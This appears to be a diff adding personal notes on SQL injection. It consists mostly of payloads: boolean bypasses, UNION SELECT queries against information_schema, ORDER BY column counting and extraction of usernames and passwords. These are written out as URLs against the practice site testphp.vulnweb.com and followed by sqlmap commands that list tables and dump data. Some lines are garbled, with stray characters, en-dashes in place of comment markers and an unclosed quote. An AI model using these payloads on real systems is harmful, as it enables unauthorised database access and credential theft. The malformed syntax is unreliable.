@@ -1,0 +1,65 @@
+Use the payload: ' OR '1'='1'  
+
+List all users: 
+SELECT * FROM users WHERE id = 1' OR '1'='1
+
+List All Tables 
+1' UNION SELECT null, table_name FROM information_schema.tables# 
+
+Extract Current Database Name 
+1 union select 1,database(),version() 
+
+Display column names of the specific table: 
+1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='SCHEMATA
+
+ Visit: http://testphp.vulnweb.com/artists.php. 
+ Notice the URL parameter ?artist=1. This indicates that the artist parameter is passed to 
+the backend. 
+ Test for SQL injection by appending a single quote (') to the URL: 
+ http://testphp.vulnweb.com/artists.php?artist=1 
+
+ Bypass query logic with this payload: 
+http://testphp.vulnweb.com/artists.php?artist=1 OR 1=1 – OR 1=1 
+
+ Find Number of Columns 
+ Use the ORDER BY technique to determine the number of columns: 
+ http://testphp.vulnweb.com/artists.php?artist=1 ORDER BY 1 -- 
+ http://testphp.vulnweb.com/artists.php?artist=1 ORDER BY 2 – 
+
+Use the UNION SELECT method to retrieve data: 
+ 
+T12[[ 
+http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1,2,3 –
+
+Query the information_schema to retrieve database names: 
+http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, schema_name, 3 FROM information_schema.schemata --
+
+
+Retrieve table names: 
+http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, table_name, 3 FROM 
+information_schema.tables WHERE table_schema='target_database' –
+
+ 
+Retrieving database and version name, machine details 
+   
+10 union select 1,database(),version() 
+
+Display table names: 
+10 union select 1,2, table_name from information_schema.tables where table_schema=database() limit 0,1
+
+Extract data from specific columns: 
+http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, username, password FROM users – 
+
+
+ 
+Using group concat function to display column names 
+ 
+10 union select 1,2, group_concat(column_name) from information_schema.columns where table_name='users' 
+
+#In terminal
+
+ 
+sqlmap -u "http://testphp.vulnweb.com/userinfo.php" --data="uname=test&pass=test"
+
+List tables:--tables -D <database_name> 
+Dump data:--dump -T <table_name> -D <database_name> 
